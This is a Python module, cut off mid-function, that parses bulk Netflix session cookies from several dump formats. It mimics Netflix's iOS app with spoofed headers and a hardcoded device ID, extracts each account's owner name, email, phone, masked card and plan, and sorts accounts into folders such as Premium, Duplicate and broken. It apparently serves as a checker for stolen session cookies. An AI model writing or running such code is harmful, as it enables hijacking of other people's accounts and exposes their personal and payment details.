# netflix_api.py
import re
import json
import html
import unicodedata
import requests
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ==================== CONSTANTS ====================
PLAN_FOLDERS = {
    "premium": "Premium",
    "standard": "Standard",
    "standard_with_ads": "Standard With Ads",
    "basic": "Basic",
    "mobile": "Mobile",
    "extra_member_premium": "Premium (Extra Member)",
    "free": "Free",
    "duplicate": "Duplicate",
    "broken": "broken",
    "failed": "failed",
    "unknown": "Unknown",
}

COUNTRY_NAMES = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra", "AO": "Angola",
    "AR": "Argentina", "AM": "Armenia", "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan",
    "BS": "Bahamas", "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan", "BO": "Bolivia",
    "BA": "Bosnia and Herzegovina", "BW": "Botswana", "BR": "Brazil", "BN": "Brunei",
    "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi", "KH": "Cambodia",
    "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde", "CL": "Chile", "CN": "China",
    "CO": "Colombia", "CG": "Congo", "CD": "Congo (DRC)", "CR": "Costa Rica",
    "HR": "Croatia", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
    "EG": "Egypt", "SV": "El Salvador", "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji",
    "FI": "Finland", "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
    "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada", "GT": "Guatemala",
    "GN": "Guinea", "GY": "Guyana", "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong",
    "HU": "Hungary", "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy", "JM": "Jamaica",
    "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan", "KE": "Kenya", "KW": "Kuwait",
    "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia", "LB": "Lebanon", "LT": "Lithuania",
    "LU": "Luxembourg", "MY": "Malaysia", "MV": "Maldives", "MT": "Malta", "MX": "Mexico",
    "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro", "MA": "Morocco",
    "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia", "NP": "Nepal", "NL": "Netherlands",
    "NZ": "New Zealand", "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway",
    "OM": "Oman", "PK": "Pakistan", "PA": "Panama", "PG": "Papua New Guinea",
    "PY": "Paraguay", "PE": "Peru", "PH": "Philippines", "PL": "Poland", "PT": "Portugal",
    "PR": "Puerto Rico", "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
    "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SG": "Singapore",
    "SK": "Slovakia", "SI": "Slovenia", "ZA": "South Africa", "ES": "Spain",
    "LK": "Sri Lanka", "SD": "Sudan", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
    "TW": "Taiwan", "TZ": "Tanzania", "TH": "Thailand", "TN": "Tunisia", "TR": "Turkey",
    "UG": "Uganda", "UA": "Ukraine", "AE": "United Arab Emirates", "GB": "United Kingdom",
    "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VE": "Venezuela",
    "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia", "ZW": "Zimbabwe",
}

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {n.lower(): n for n in ALL_NETFLIX_COOKIE_NAMES}

# ==================== NFToken API ====================
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


# ==================== HELPERS ====================
def _strip_surrogates(text):
    if not isinstance(text, str):
        return text
    return "".join(c for c in text if not (0xD800 <= ord(c) <= 0xDFFF))


def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    for src, dst in {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ",
                     "&nbsp;": " ", "u00A0": " "}.items():
        cleaned = cleaned.replace(src, dst)
    cleaned = (cleaned.replace("\\/", "/").replace('\\"', '"')
                      .replace("\\n", " ").replace("\\t", " "))
    for _ in range(3):
        prev = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == prev:
            break
    cleaned = re.sub(r"(?<=[A-Za-z])\s+(?=[^\x00-\x7F])", "", cleaned)
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return _strip_surrogates(cleaned) or None


def extract_first_match(text, patterns, flags=0):
    for pattern in patterns:
        m = re.search(pattern, text, flags)
        if m:
            return decode_netflix_value(m.group(1))
    return None


def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        if value == 1:
            return True
        if value == 0:
            return False
        return None
    if isinstance(value, dict):
        for key in ("value", "isUserOnHold", "holdStatus", "isOnHold",
                    "pastDue", "isPastDue", "isVerified", "verified"):
            if key in value:
                p = parse_boolean_value(value.get(key))
                if p is not None:
                    return p
        return None
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    v = str(cleaned).strip().lower()
    if v in {"true", "yes", "1", "on"}:
        return True
    if v in {"false", "no", "0", "off"}:
        return False
    return None


def format_boolean_label(value):
    p = parse_boolean_value(value)
    if p is True:
        return "Yes"
    if p is False:
        return "No"
    return None


def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    s = unicodedata.normalize("NFKD", plan_name)
    s = "".join(c for c in s if not unicodedata.combining(c))
    return re.sub(r"[^\w]+", "_", s.lower(), flags=re.UNICODE).strip("_") or "unknown"


def get_full_country_name(code):
    if not code:
        return ""
    return COUNTRY_NAMES.get(code.upper(), code)


def normalize_phone_number(value, country_code=None):
    if not value:
        return None
    digits = re.sub(r"\D+", "", str(value))
    if digits.startswith("0") and len(digits) >= 10:
        return f"+91{digits.lstrip('0')}"
    return value


def format_display_date(value):
    if not value:
        return ""
    try:
        return datetime.strptime(value.split("T")[0], "%Y-%m-%d").strftime("%B %d, %Y")
    except Exception:
        return value


def format_member_since(value):
    if not value:
        return ""
    try:
        dt = datetime.strptime(value, "%Y-%m") if len(value) == 7 else datetime.strptime(value, "%Y-%m-%d")
        return dt.strftime("%B %Y")
    except Exception:
        return value


def _int_or_none(value):
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    try:
        return int(str(cleaned).strip())
    except Exception:
        m = re.search(r"\d+", str(cleaned))
        return int(m.group(0)) if m else None


def get_days_left(next_billing_date):
    if not next_billing_date:
        return None
    try:
        dt = datetime.strptime(next_billing_date.split("T")[0], "%Y-%m-%d")
        today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        return max(0, (dt - today).days)
    except Exception:
        return None


def format_quality(plan_key, raw_quality, streams):
    if plan_key == "premium" or (streams is not None and streams >= 4):
        return "UHD 4K"
    if plan_key in ("standard", "standard_with_ads") or (streams is not None and streams >= 2):
        return "FHD 1080"
    if plan_key == "basic" or (streams is not None and streams == 1):
        return "HD 720"
    if raw_quality:
        rl = raw_quality.lower()
        if "uhd" in rl or "4k" in rl:
            return "UHD 4K"
        if "fhd" in rl or "1080" in rl:
            return "FHD 1080"
        if "hd" in rl or "720" in rl:
            return "HD 720"
        return raw_quality
    return "Unknown"


# ==================== COOKIE PARSING ====================
def canonicalize_netflix_cookie_name(name):
    n = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(n.lower(), n)


def is_netflix_domain(domain):
    d = str(domain or "").strip()
    if d.startswith("#HttpOnly_"):
        d = d[len("#HttpOnly_"):]
    return "netflix." in d.lower()


def is_netflix_cookie_entry(domain, name):
    return canonicalize_netflix_cookie_name(name) in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)


def has_required_netflix_cookies(cookies):
    if not isinstance(cookies, dict):
        return False
    return all(decode_netflix_value(cookies.get(n)) for n in LOGIN_REQUIRED_NETFLIX_COOKIES)


def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped:
        return []
    if stripped.startswith("#") and not stripped.startswith("#HttpOnly_"):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    if not stripped:
        return []
    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", stripped, maxsplit=6)
    return parts if len(parts) >= 7 else []


def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    return bool(re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()))


def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    norm_exp = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", norm_exp):
        try:
            norm_exp = str(int(float(norm_exp)))
        except Exception:
            pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": norm_exp or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }


def format_netscape_cookie_entry(e):
    return (f"{e['domain']}\t{e['tail_match']}\t{e['path']}\t{e['secure']}\t"
            f"{e['expires']}\t{e['name']}\t{e['value']}")


def extract_netscape_cookie_entries(text):
    out = []
    for i, line in enumerate(text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        name = canonicalize_netflix_cookie_name(parts[5])
        if not is_netflix_cookie_entry(parts[0], name):
            continue
        out.append(build_netscape_cookie_entry(
            parts[0], parts[1], parts[2], parts[3], parts[4], name, parts[6], i))
    return out


def extract_json_cookie_entries(content):
    try:
        data = json.loads(content)
    except Exception:
        return []
    if isinstance(data, dict):
        if isinstance(data.get("cookies"), list):
            data = data["cookies"]
        elif isinstance(data.get("items"), list):
            data = data["items"]
        else:
            data = [data]
    if not isinstance(data, list):
        return []
    out = []
    for i, c in enumerate(data):
        if not isinstance(c, dict):
            continue
        name = canonicalize_netflix_cookie_name(c.get("name", ""))
        if not is_netflix_cookie_entry(c.get("domain", ""), name):
            continue
        out.append(build_netscape_cookie_entry(
            c.get("domain", ""),
            "TRUE" if str(c.get("domain", "")).startswith(".") else "FALSE",
            c.get("path", "/"),
            "TRUE" if c.get("secure", False) else "FALSE",
            c.get("expirationDate", c.get("expiration", 0)),
            name, c.get("value", ""), i))
    return out


def extract_raw_cookie_entries(text):
    names_alt = "|".join(sorted((re.escape(n) for n in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))
    pat = re.compile(rf"(?:['\"])?(?P<name>{names_alt})(?:['\"])?\s*(?:=|:)\s*"
                     r"(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.IGNORECASE)
    out = []
    for i, m in enumerate(pat.finditer(text)):
        name = canonicalize_netflix_cookie_name(m.group("name"))
        value = m.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        out.append(build_netscape_cookie_entry(
            ".netflix.com", "TRUE", "/",
            "TRUE" if name == "SecureNetflixId" else "FALSE",
            "0", name, value, i))
    return out


def cookies_dict_from_netscape(text):
    cookies = {}
    for line in text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7:
            name = canonicalize_netflix_cookie_name(parts[5])
            if is_netflix_cookie_entry(parts[0], name):
                cookies[name] = parts[6]
    return cookies


def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []
    by_name = {}
    for e in entries:
        if e.get("name"):
            by_name.setdefault(e["name"], []).append(e)
    if not by_name:
        return []
    count = len(by_name.get("NetflixId", [])) or max(len(v) for v in by_name.values())
    bundles = []
    for idx in range(count):
        selected = []
        for name_entries in by_name.values():
            if idx < len(name_entries):
                selected.append(name_entries[idx])
            elif len(name_entries) == 1:
                selected.append(name_entries[0])
        if not selected:
            continue
        selected.sort(key=lambda x: x.get("position", 0))
        text = "\n".join(format_netscape_cookie_entry(e) for e in selected)
        bundles.append({"index": idx + 1, "total": count,
                        "netscape_text": text,
                        "cookies": cookies_dict_from_netscape(text)})
    return bundles


def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries,
                      extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []


# ==================== ACCOUNT INFO EXTRACTION ====================
def extract_profile_names(text):
    names = []
    for pattern in [
        r'"profileName"\s*:\s*"([^"]+)"',
        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
    ]:
        for found in re.findall(pattern, text, re.DOTALL):
            d = decode_netflix_value(found)
            if d and d not in names:
                names.append(d)
    for match in re.finditer(r'"__typename"\s*:\s*"Profile"', text):
        snippet = text[match.start():match.start() + 1200]
        nm = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
        if nm:
            d = decode_netflix_value(nm.group(1))
            if d and d not in names:
                names.append(d)
    return names


def extract_info_from_graphql_payload(text):
    try:
        payload = json.loads(text)
    except Exception:
        return {}
    if not isinstance(payload, dict):
        return {}
    data = payload.get("data") or {}
    growth = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth.get("nextBillingDate") or {}
    hold_meta = growth.get("growthHoldMetadata") or {}
    local_phone = growth.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth.get("profiles") or []

    phone_digits = None
    phone_verified = None
    if isinstance(raw_phone, dict):
        pd = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = pd.get("value") if isinstance(pd, dict) else raw_phone.get("phoneNumberDigits")
        phone_verified = raw_phone.get("isVerified")
    else:
        phone_digits = raw_phone

    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        ge = profile_obj.get("growthEmail") or {}
        eo = ge.get("email") or {}
        return (eo.get("value") if isinstance(eo, dict) else None, ge.get("isVerified"))

    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for p in profiles:
            email_value, email_verified = _growth_email(p)
            if email_value:
                break

    profile_names = []
    for p in profiles:
        if isinstance(p, dict):
            n = decode_netflix_value(p.get("name"))
            if n and n not in profile_names:
                profile_names.append(n)

    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for f in (plan_obj.get("availableFeatures") or []):
            if isinstance(f, dict) and f.get("type"):
                feature_types.append(str(f["type"]).upper())

    def _extract_price(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        for cand in (plan_obj.get("priceDisplay"), plan_obj.get("displayPrice"),
                     plan_obj.get("formattedPrice"), plan_obj.get("formattedPlanPrice"),
                     plan_obj.get("planPriceDisplay")):
            d = decode_netflix_value(cand)
            if d:
                return d
        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice",
                        "displayPrice", "value", "amountDisplay"):
                d = decode_netflix_value(price_obj.get(key))
                if d:
                    return d
        return None

    hold_status = None
    if isinstance(hold_meta, dict):
        hold_status = format_boolean_label(hold_meta.get("isUserOnHold"))
    if hold_status is None:
        hold_status = format_boolean_label(growth.get("isUserOnHold"))

    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "membershipStatus": decode_netflix_value(growth.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price(current_plan) or _extract_price(next_plan),
        "paymentMethodType": decode_netflix_value(payment_logo or growth.get("payer")),
        "maskedCard": None,
        "phoneNumber": phone_digits,
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": hold_status,
        "emailVerified": format_boolean_label(email_verified),
        "phoneVerified": format_boolean_label(phone_verified),
        "profiles": ", ".join(profile_names) if profile_names else None,
        "maxStreams": decode_netflix_value(current_plan.get("maxStreams")),
    }
    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display:
            info["maskedCard"] = payment_display
    elif payment_display and payment_logo is None and not re.fullmatch(r"\d{4}", payment_display):
        info["paymentMethodType"] = info["paymentMethodType"] or payment_display
    return {k: v for k, v in info.items() if v not in (None, "", [], {})}


def has_complete_account_info(info):
    if not info:
        return False
    required = ("countryOfSignup", "membershipStatus", "localizedPlanName",
                "maxStreams", "videoQuality")
    return all(info.get(f) and info.get(f) != "null" for f in required)


def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for k, v in (primary or {}).items():
        if v not in (None, "", [], {}):
            merged[k] = v
    return merged


def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    extra_member_patterns = (
        r"assinante\s+extra\s+no\s+plano\s+de\s+outra\s+pessoa",
        r"suscriptor\s+extra\s+en\s+el\s+plan\s+de\s+otra\s+persona",
        r"extra\s+on\s+someone.?else.?s\s+plan",
        r"abbonato\s+extra\s+sul\s+piano\s+di\s+un.?altra\s+persona",
        r"abonn[ée]\s+suppl[ée]mentaire\s+sur\s+le\s+forfait",
        r"ekstra\s+uye\s+bir\s+baskasinin\s+planinda",
    )
    extra_member_by_text = any(re.search(p, response_text, re.IGNORECASE)
                               for p in extra_member_patterns)

    if has_complete_account_info(graphql_info):
        extracted = dict(graphql_info)
    else:
        extracted = {
            "accountOwnerName": extract_first_match(response_text, [
                r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
                r'"accountOwnerName"\s*:\s*"([^"]+)"',
                r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"firstName"\s*:\s*"([^"]+)"',
            ]),
            "email": extract_first_match(response_text, [
                r'"emailAddress"\s*:\s*"([^"]+)"',
                r'"email"\s*:\s*"([^"]+)"',
                r'"loginId"\s*:\s*"([^"]+)"',
            ]),
            "countryOfSignup": extract_first_match(response_text, [
                r'"currentCountry"\s*:\s*"([^"]+)"',
                r'"countryOfSignup":\s*"([^"]+)"',
            ]),
            "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
            "nextBillingDate": extract_first_match(response_text, [
                r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
                r'"nextBillingDate"\s*:\s*"([^"]+)"',
                r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            ]),
            "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
            "showExtraMemberSection": extract_first_match(response_text, [
                r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                r'"showExtraMemberSection"\s*:\s*(true|false)',
            ]),
            "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
            "maxStreams": extract_first_match(response_text, [
                r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
                r'"maxStreams"\s*:\s*"?([^",]+)"?',
            ]),
            "localizedPlanName": extract_first_match(response_text, [
                r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
                r'"localizedPlanName"\s*:\s*"([^"]+)"',
                r'"planName"\s*:\s*"([^"]+)"',
            ]),
            "planPrice": extract_first_match(response_text, [
                r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
                r'"formattedPrice"\s*:\s*"([^"]+)"',
                r'"planPriceDisplay"\s*:\s*"([^"]+)"',
                r'"displayPrice"\s*:\s*"([^"]+)"',
                r'"planPrice"\s*:\s*"([^"]+)"',
            ]),
            "paymentMethodType": extract_first_match(response_text, [
                r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"paymentMethod"\s*:\s*"([^"]+)"',
                r'"paymentType"\s*:\s*"([^"]+)"',
            ]),
            "maskedCard": extract_first_match(response_text, [
                r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"',
                r'"paymentCardDisplayString"\s*:\s*"([^"]+)"',
                r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
                r'"lastFour"\s*:\s*"([^"]+)"',
                r'"maskedCard"\s*:\s*"([^"]+)"',
            ]),
            "phoneNumber": extract_first_match(response_text, [
                r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
                r'"phoneNumber"\s*:\s*"([^"]+)"',
                r'"mobilePhone"\s*:\s*"([^"]+)"',
            ]),
            "phoneVerified": extract_first_match(response_text, [
                r'"phoneVerified"\s*:\s*(true|false)',
                r'"isPhoneVerified"\s*:\s*(true|false)',
            ]),
            "videoQuality": extract_first_match(response_text, [
                r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                r'"videoQuality"\s*:\s*"([^"]+)"',
            ]),
            "holdStatus": extract_first_match(response_text, [
                r'"holdStatus"\s*:\s*(true|false)',
                r'"holdStatus"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*(true|false)',
                r'"isUserOnHold"\s*:\s*(true|false)',
                r'"pastDue"\s*:\s*(true|false)',
            ]),
            "emailVerified": extract_first_match(response_text, [
                r'"emailVerified"\s*:\s*(true|false)',
                r'"isEmailVerified"\s*:\s*(true|false)',
            ]),
            "profiles": ", ".join(extract_profile_names(response_text)) or None,
        }
        extracted = merge_info(graphql_info, extracted)
        if extra_member_by_text:
            extracted["isExtraMemberAccount"] = "Yes"

    for bf in ["holdStatus", "emailVerified", "showExtraMemberSection", "phoneVerified"]:
        if extracted.get(bf) is not None and extracted[bf] not in ("Yes", "No"):
            extracted[bf] = format_boolean_label(extracted[bf])
    return extracted


def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))

    if not is_subscribed and not raw_plan:
        return "free", "Free"

    normalized = normalize_plan_key(raw_plan) if raw_plan else ""

    aliases = {
        "premium": {"premium", "premium_extra_member", "extra_member_premium",
                    "cao_cap", "cao_cap_plan", "caocap", "高級", "高级", "프리미엄",
                    "プレミアム", "premium_plan"},
        "standard_with_ads": {"standard_with_ads", "standardwithads",
                              "estandar_con_anuncios", "padrao_com_anuncios",
                              "padrao_com_publicidade", "standard_avec_pub",
                              "standard_con_pubblicita"},
        "standard": {"standard", "estandar", "padrao", "standart", "standar",
                     "標準", "标准", "스탠다드", "スタンダード", "standardowy"},
        "basic": {"basic", "basic_with_ads", "basico", "basique", "basis",
                  "基本", "베이직", "ベーシック", "podstawowy", "base"},
        "mobile": {"ponsel", "mobile", "seluler", "movil", "모바일", "モバイル"},
    }
    for canonical, aset in aliases.items():
        if normalized in aset:
            return canonical, PLAN_FOLDERS.get(canonical, raw_plan)

    if streams is not None:
        qn = normalize_plan_key(raw_quality) if raw_quality else ""
        if streams >= 4 or qn in {"uhd", "ultra_hd", "4k"}:
            return "premium", "Premium"
        if streams >= 2 or qn in {"hd", "full_hd"}:
            return "standard", "Standard"
        if streams == 1:
            return ("mobile", "Mobile") if normalized in {"ponsel", "mobile"} else ("basic", "Basic")

    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"


def is_extra_member_account(info):
    if not isinstance(info, dict):
        return False
    explicit = decode_netflix_value(info.get("isExtraMemberAccount"))
    if explicit:
        lv = explicit.strip().lower()
        if lv in {"yes", "true", "1"}:
            return True
        if lv in {"no", "false", "0"}:
            return False
    values = [decode_netflix_value(info.get("localizedPlanName")) or "",
              decode_netflix_value(info.get("membershipStatus")) or ""]
    text_markers = ("extra member", "miembro extra", "suscriptor extra",
                    "membro extra", "assinante extra", "abbonato extra",
                    "abonne supplementaire", "abonné supplémentaire",
                    "ekstra uye", "ekstra üye", "额外成员", "額外成員",
                    "추가 회원", "추가회원")
    for value in values:
        if not value:
            continue
        lv = value.lower()
        if any(m in lv for m in text_markers):
            return True
    return False


def is_subscribed_account(info):
    if normalize_plan_key((info or {}).get("membershipStatus")) == "current_member":
        return True
    return is_extra_member_account(info)


# ==================== ACCOUNT PAGE ====================
def get_account_page(session, proxy=None, request_timeout=15, fallback_account_page=True):
    headers = {
